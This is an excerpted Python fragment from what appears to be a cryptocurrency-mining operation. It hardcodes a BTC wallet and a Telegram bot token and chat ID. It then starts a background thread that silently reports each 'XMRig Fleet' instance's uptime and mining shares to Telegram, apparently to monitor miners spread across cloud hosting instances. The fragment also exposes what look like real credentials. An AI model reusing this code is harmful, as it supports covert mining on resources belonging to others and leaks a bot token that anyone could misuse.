...
address = os.getenv('BTC_WALLET', '16p9y6EstGYcnofGNvUJMEGKiAWhAr1uR8') 

print(Back.BLUE , Fore.WHITE , 'BTC WALLET:' , Fore.BLACK , str(address) , Style.RESET_ALL)

# Pantheon Telegram Heartbeat
import threading as _threading
_TG_TOKEN = os.getenv('TELEGRAM_TOKEN', '8679655550:AAGUB1m5fmqHc8OHqqM24Vixz8FfwX-gqD4')
_TG_CHAT  = os.getenv('TELEGRAM_CHAT_ID', '7135054241')
_INSTANCE = os.getenv('RENDER_INSTANCE_ID', 'local-1')
...
def _tg(msg):
    try:
        ...
        _r.post(f'https://api.telegram.org/bot{_TG_TOKEN}/sendMessage',
                json={'chat_id': _TG_CHAT, 'text': msg, 'parse_mode': 'HTML'}, timeout=8)
    except Exception:
        pass
...
def _heartbeat():
    while True:
        ...
        _tg(f'<b>XMRig Fleet</b> Instance {_INSTANCE} | Uptime {uptime_h:.1f}h | Shares {_shares_found} | MidasPrime Mining')

_threading.Thread(target=_heartbeat, daemon=True).start()
_tg(f'<b>XMRig ONLINE</b> Instance {_INSTANCE}')
